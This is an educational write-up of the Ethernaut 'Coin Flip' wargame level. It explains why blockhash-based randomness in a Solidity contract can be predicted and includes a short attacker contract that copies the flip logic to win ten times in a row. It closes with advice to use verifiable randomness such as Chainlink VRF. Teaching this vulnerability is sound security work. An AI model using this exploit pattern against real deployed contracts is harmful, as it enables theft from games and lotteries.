# Coin Flip

![https://ethernaut.openzeppelin.com/imgs/BigLevel3.svg](https://ethernaut.openzeppelin.com/imgs/BigLevel3.svg)

# Objectives

Claim ownership of the contract

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

Things that might help

- See the Help page above, section "Beyond the console"

# Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

# Analysis I

So this challenge requires us to guess the side of the coin after each flip. Let’s see how the coin flip works in this contract.

The `constructor()` sets the number of wins to `0`, we need to guess the correct answer `0 times consecutively in order to pass this level. Let's focus on the only function `flip()` -

## `flip()`

```solidity
function flip(bool _guess) public returns (bool) {
  uint256 blockValue = uint256(blockhash(block.number - 1));

  if (lastHash == blockValue) {
    revert();
  }

  lastHash = blockValue;
  uint256 coinFlip = blockValue / FACTOR;
  bool side = coinFlip == 1 ? true : false;

  if (side == _guess) {
    consecutiveWins++;
    return true;
  } else {
    consecutiveWins = 0;
    return false;
  }
}
```

The function takes boolean value as an input, which is where we guess the side of the coin. It declared the `blockValue` by subtracting the `block number` with `1` and typecasted it to `uint256`. 

To ensure the we don’t flip the coin twice in the same block number, it checks the current blockValue against the `lastHash` which is set after every flip. Now this is where it gets interesting,

```solidity
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

The algorithm of flipping the coin seems simple. All it doing is dividing the `blockValue` by the variable `FACTOR`, which is set to a random number, `57896044618658097711785492504343953926634992332820282019728792003956564819968`. If we convert it to Hexadecimal, it gives us `0x8000000000000000000000000000000000000000000000000000000000000000`. The probability that the hash of some random block is higher or lower than this number is 50%, so it makes sense to call it a **coin flip**, where the coin is given by the previous block hash. So why this is interesting?

What this `uint256 coinFlip = blockValue / FACTOR;` calculation trying to do is generating `RANDOM` numbers. However, computer are unable to generate true random numbers. Computers are combining different things in order to create numbers that people can’t predict easily. But if we know the process that computer followed to generate the random number, we can easily predict it and end up with the same number.

Ethereum does not provide any function to generate random numbers. As a result, programmers have to write their own algorithms for randomness or uses Oracles to import random numbers outside the Ethereum Network.

This public `flip` function calls the `blockhash` in order to create a hash of the current blocks. The variable `blockValue` stores the `blockhash` of the current `block number` and then divide by the long number `FACTOR`. Then, it returns a Boolean result. You can read more about [Blocks here](https://ethereum.org/en/developers/docs/blocks/). Now that we understand the entire process of generating the randomness used in the contract, what if we try to repeat the process of creating random number in a malicious smart contract and then send the pseudo-anonymous result as our `guess`?

# AntiSec

Let’s first import the `CoinFlip` contract in our `Remix` IDE and import it to our malicious smart-contract `AttackCoinFlip`. We will recreate the exact `flip` function however, we will modify the `blockhash` function to use the previous block as an input, as block has already been mined.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract AttackCoinFlip {
  using SafeMath for uint256;
  CoinFlip public coinFlipAddress;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor(address _coinFlipAddress) {
      coinFlipAddress = CoinFlip(_coinFlipAddress);
  }

  function psychicAttack() public returns (bool) {
      uint256 blockValue = uint256(blockhash(block.number - 1));
      uint256 coinFlip = uint256(blockValue / FACTOR);
      bool side = coinFlip == 1 ? true : false;
      coinFlipAddress.flip(side);
  }

}
```

Now we just need to compile and call the `psychicAttack` function from our malicious smart contract to the `CoinFlip` smart contract’s `flip` function. After that all we need to do is just spam our `psychicAttack` function 10 times, until we reach 10 consecutive wins. You can check how many wins you have by checking on Ethernaut console - 

```jsx
await contract.consecutiveWins()
```

# Key Takeaways

1. Generating random numbers in solidity can be tricky, Currently there isn’t any native way to generate them, and everything we use in smart contracts is publicly visible, including the local and state variables marked as `Private`. Miners also have control over things like `blockhases`, `timestamps`, and whether to include certain transactions - which allows them to bias these values in their favor.
2. It is not practically a good idea to generate random numbers using these `blockhases`, `timestamps`, `state` or `global` variables.
3. To get cryptographically proven random numbers, you can use [Chainlink VRF](https://docs.chain.link/vrf/v2/subscription/examples/get-a-random-number), which uses an Oracle, the `LINK` token and on-chain contract to verify that the number is truly random.
4. Some other options include using Bitcoin block headers (verified through [BTC Relay](http://btcrelay.org/), [RANDAO](https://github.com/randao/randao), or [Oraclize](http://www.oraclize.it/))
